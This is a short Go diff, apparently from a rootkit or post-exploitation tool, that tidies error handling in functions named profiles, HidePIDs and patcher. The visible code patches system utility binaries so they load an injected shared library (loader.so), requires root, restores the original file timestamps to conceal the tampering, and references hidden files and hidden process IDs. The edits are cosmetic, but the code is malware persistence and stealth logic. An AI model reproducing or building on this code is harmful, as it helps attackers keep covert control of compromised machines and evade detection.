@@ -107,11 +107,11 @@ func profiles() (err error) {
 	}
 	user, err := user.Current()
 	if err != nil {
-		return fmt.Errorf("Cannot get user profile: %v", err)
+		return fmt.Errorf("cannot get user profile: %v", err)
 	}
 	accountInfo, err := CheckAccount(user.Name)
 	if err != nil {
-		return fmt.Errorf("Cannot check account info: %v", err)
+		return fmt.Errorf("cannot check account info: %v", err)
 	}
 
 	// source
@@ -132,7 +132,7 @@ func profiles() (err error) {
 	if strings.Contains(accountInfo["shell"], "nologin") ||
 		strings.Contains(accountInfo["shell"], "false") {
 		if user.Uid != "0" {
-			return errors.New("This user cannot login")
+			return errors.New("this user cannot login")
 		}
 	}
 
@@ -231,7 +231,7 @@ func HidePIDs() (err error) {
 // patch ELF file so it automatically loads and runs loader.so
 func patcher() (err error) {
 	if !HasRoot() {
-		return errors.New("Root required")
+		return errors.New("root required")
 	}
 
 	// PIDs
@@ -249,6 +249,7 @@ func patcher() (err error) {
 	if err != nil {
 		log.Printf("Cannot create %s: %v", Hidden_Files, err)
 	}
+	var err_list []error
 
 	// patch system utilities
 	for _, file := range Patched_List {
@@ -263,7 +264,7 @@ func patcher() (err error) {
 		}
 		e := AddNeededLib(file, so_path)
 		if e != nil {
-			err = fmt.Errorf("%v; %v", err, e)
+			err_list = append(err_list, e)
 		}
 
 		// Restore the original file timestamps
@@ -272,6 +273,9 @@ func patcher() (err error) {
 		if err != nil {
 			return err
 		}
+	}
+	if len(err_list) > 0 {
+		return fmt.Errorf("patcher: %v", err_list)
 	}
 	return
 }
